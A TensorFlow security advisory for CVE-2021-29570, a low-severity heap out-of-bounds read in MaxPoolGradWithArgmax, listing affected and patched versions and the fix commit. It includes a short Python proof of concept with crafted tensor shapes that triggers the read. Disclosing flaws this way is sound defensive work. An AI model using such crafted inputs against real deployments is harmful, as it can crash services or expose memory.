# Heap out of bounds read in `MaxPoolGradWithArgmax`

Low

[mihaimaruseac](/mihaimaruseac)
published
GHSA-545v-42p7-98fq
May 13, 2021

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.5.0

## Patched versions

2.1.4, 2.2.3, 2.3.3, 2.4.2

## Description

### Impact

The implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:

```
import tensorflow as tf

input = tf.constant([10.0, 10.0, 10.0], shape=[1, 1, 3, 1], dtype=tf.float32)
grad = tf.constant([10.0, 10.0, 10.0, 10.0], shape=[1, 1, 1, 4], dtype=tf.float32)
argmax = tf.constant([1], shape=[1], dtype=tf.int64)
ksize = [1, 1, 1, 1]
strides = [1, 1, 1, 1]

tf.raw_ops.MaxPoolGradWithArgmax(
  input=input, grad=grad, argmax=argmax, ksize=ksize, strides=strides,
  padding='SAME', include_batch_in_index=False)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/ef0c008ee84bad91ec6725ddc42091e19a30cf0e/tensorflow/core/kernels/maxpooling_op.cc#L1016-L1017) uses the same value to index in two different arrays but there is no guarantee that the sizes are identical.

### Patches

We have patched the issue in GitHub commit [dcd7867de0fea4b72a2b34bd41eb74548dc23886](https://github.com/tensorflow/tensorflow/commit/dcd7867de0fea4b72a2b34bd41eb74548dc23886).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.

### Severity

Low

### CVE ID

CVE-2021-29570

### Weaknesses

No CWEs
